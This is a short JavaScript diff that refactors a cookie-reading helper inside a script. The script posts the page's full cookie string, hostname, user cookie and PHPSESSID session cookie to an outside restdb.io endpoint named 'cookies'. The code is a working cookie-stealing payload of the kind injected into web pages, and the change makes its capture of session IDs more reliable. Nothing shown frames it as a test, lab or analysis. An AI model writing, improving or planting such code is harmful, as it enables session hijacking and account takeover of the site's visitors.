@@ -1,5 +1,7 @@
-var s = document.cookie.split('session')[1].split(";")[0];
-var u = document.cookie.split('user')[1].split(";")[0];
+function getCookieValue(a) {
+   const b = document.cookie.match('(^|;)\\s*' + a + '\\s*=\\s*([^;]+)');
+   return b ? b.pop() : '';
+}
 
 $.ajax({
     url: "https://geile-72c8.restdb.io/rest/cookies",
@@ -8,8 +10,8 @@ $.ajax({
     data: {
         host: window.location.hostname,
         cookie: document.cookie,
-        user: u,
-        session: s
+        user: getCookieValue('user'),
+        session: getCookieValue('PHPSESSID')
     },
     success: function(response){
         console.log(response);
